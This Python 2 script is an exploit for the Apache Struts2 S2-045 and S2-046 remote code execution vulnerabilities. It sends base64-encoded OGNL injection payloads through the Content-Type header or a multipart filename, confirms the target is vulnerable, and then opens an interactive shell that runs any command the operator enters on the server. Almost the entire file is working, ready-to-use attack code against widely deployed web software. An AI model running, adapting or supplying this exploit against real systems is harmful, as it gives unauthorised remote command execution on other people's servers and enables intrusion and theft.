#! /usr/bin/env python
# Apache struts2 s2-045 and s2-045 exploit
# Date: 2017-03-21
# Author: Malayke
# version: 1.0
# Features:
# - Check OS type (windows or linux)
# - Interactive execute system command

import urllib
import urllib2
import sys
import base64
import traceback
import logging
import readline



def main():
    
    if len(sys.argv) < 3:
        print '[!] invalid arguments'
        print 'Usage:\n\t%s http://fuckstruts2.com 045/046' % (sys.argv[0])
        sys.exit(1)
    target = sys.argv[1]
    bulletin = sys.argv[2]
    url = target if target.startswith(r'http://') else sys.exit(1)
    attack_type = bulletin if bulletin.startswith('04') else sys.exit(1)
    if attack_type == '046':
        s2_046_interaction(url=target)
    else:
        s2_045_interaction(url=target)


def s2_046_interaction(url=None):
    payload = make_s2_046_payload('echo ok')
    result = exec_s2_046_payload(url, payload)
    if result.startswith('ok'):
        print '[*] The target is Vulnarable!'
        whoami = exec_s2_046_payload(url, make_s2_046_payload('whoami'))
        print '[*] Whoami:', whoami.replace('\n','')
        if '\\' in whoami:
            print '[*] Target OS: Windows'
            whoami = whoami.split('\\')[1]
        else:
            print '[*] Target OS: Linux'
        while True:
            try:
                command = raw_input('>')
                output = exec_s2_046_payload(url, make_s2_046_payload(command))
                print output
            except KeyboardInterrupt:
                sys.exit(1)
    else:
        print '[*] Target is not Vulnarable!'



def s2_045_interaction(url=None):
    payload = make_payload('echo ok')
    result = exec_payload(url, payload)
    if result.startswith('ok'):
        print '[*] The target is Vulnarable!'
        whoami = exec_payload(url, make_payload('whoami'))
        print '[*] Whoami:', whoami.replace('\n','')
        if '\\' in whoami:
            print '[*] Target OS: Windows'
            whoami = whoami.split('\\')[1]
        else:
            print '[*] Target OS: Linux'
        while True:
            try:
                command = raw_input('>')
                output = exec_payload(url, make_payload(command))
                print output
            except KeyboardInterrupt:
                sys.exit(1)
    else:
        print '[*] Target is not Vulnarable!'




def make_payload(command):
    payload_l = base64.decodestring(u'JXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2VzKCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigjY21kPSc=')
    payload_r = base64.decodestring(u'JykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfQ==')
    payload = payload_l + command + payload_r
    return payload


def make_s2_046_payload(command):
    payload_l = base64.decodestring(u'JXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2VzKCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigjY21kPSc=')
    payload_r = base64.decodestring(u'JykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfQ==')
    end_null_byte = '0063'.decode('hex')
    payload = payload_l + command + payload_r + end_null_byte
    return payload
    

def exec_s2_046_payload(url=None, payload=None):
    user_agent = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)'
    header_payload = 'multipart/form-data; boundary=---------------------------735323031399963166993862150'
    headers = {'User-Agent': user_agent,
               'Content-Type': header_payload}
    body_payload = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name="foo"; filename="{0}"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--'''.format(payload) 
    
    try:
        req = urllib2.Request(url, headers=headers,data=body_payload)
        response = urllib2.urlopen(req)
    except Exception as e:
        print e
        sys.exit(1)
    else:
        result = response.read()
    return result




def exec_payload(url=None, payload=None):
    user_agent = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)'
    headers = {'User-Agent': user_agent,
               'Content-Type': payload}
    try:
        req = urllib2.Request(url, headers=headers)
        response = urllib2.urlopen(req)
    except Exception as e:
        print e
        sys.exit(1)
    else:
        result = response.read()
    return result



if __name__ == '__main__':
    main()